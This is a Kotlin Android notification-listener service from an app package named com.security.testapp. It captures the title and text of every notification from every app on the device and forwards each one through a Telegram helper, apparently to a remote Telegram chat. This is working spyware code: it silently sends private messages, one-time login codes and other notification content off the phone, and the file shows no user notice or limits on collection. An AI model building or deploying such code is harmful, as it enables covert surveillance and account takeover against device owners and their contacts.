package com.security.testapp

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras?.getString("android.title") ?: ""
        val text = extras?.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
        val subText = extras?.getCharSequence("android.subText")?.toString() ?: ""
        val summaryText = extras?.getCharSequence("android.summaryText")?.toString() ?: ""
        val tickerText = sbn.notification.tickerText?.toString() ?: ""

        var finalText = if (bigText.isNotEmpty()) bigText else text
        if (finalText.isEmpty()) finalText = if (subText.isNotEmpty()) subText else summaryText
        if (finalText.isEmpty()) finalText = tickerText

        val message = "🔔 Notification [$packageName]\nTitle: $title\nText: $finalText"
        TelegramHelper.sendWithFallback(message, this)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }
}
